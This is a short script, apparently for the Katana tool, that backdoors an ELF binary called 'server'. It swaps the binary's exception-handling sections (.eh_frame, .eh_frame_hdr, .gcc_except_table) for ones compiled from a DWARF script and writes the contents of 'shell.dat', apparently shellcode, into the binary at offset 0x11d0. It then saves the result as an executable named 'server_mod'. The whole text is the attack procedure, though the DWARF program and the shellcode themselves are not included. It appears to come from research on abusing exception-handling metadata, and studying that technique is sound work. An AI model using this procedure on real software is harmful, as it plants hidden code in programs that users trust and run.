#!/usr/bin/env katana
$e=load "server"
$ehframe=dwarfscript compile "server_mod.dws"
replace section $e ".eh_frame" $ehframe[0]
replace section $e ".eh_frame_hdr" $ehframe[1]
replace section $e ".gcc_except_table" $ehframe[2]
replace raw $e 0x11d0 "shell.dat"
save $e "server_mod"
!chmod +x server_mod
